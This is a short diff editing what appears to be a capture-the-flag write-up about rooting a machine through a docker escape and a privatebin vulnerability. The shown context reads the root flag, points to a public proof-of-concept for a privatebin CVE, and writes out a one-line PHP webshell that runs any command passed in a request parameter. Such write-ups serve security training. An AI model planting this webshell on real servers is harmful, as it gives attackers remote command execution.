@@ -283,9 +283,6 @@ id
 cat /root/root.txt
 # 5c7a6b6f4909f006****************
 ```
-
-![Docker Escape - Root Access](/assets/img/03-docker-escape-root.jpg)
-
 ---
 
 ### Method 2: Intended Path - Arcane Portal via privatebin
@@ -312,7 +309,7 @@ Found public PoC:
 https://github.com/Medaz-Sploit/CVE-2025-64714-privatebin-2.0.2-PoC
 
 
-Created PHP webshell in writable directory:
+Created PHP webshell as ben in writable directory:
 
 ```bash
 echo '<?php system($_REQUEST["cmd"]); ?>' > /privatebin-data/data/ch3.php
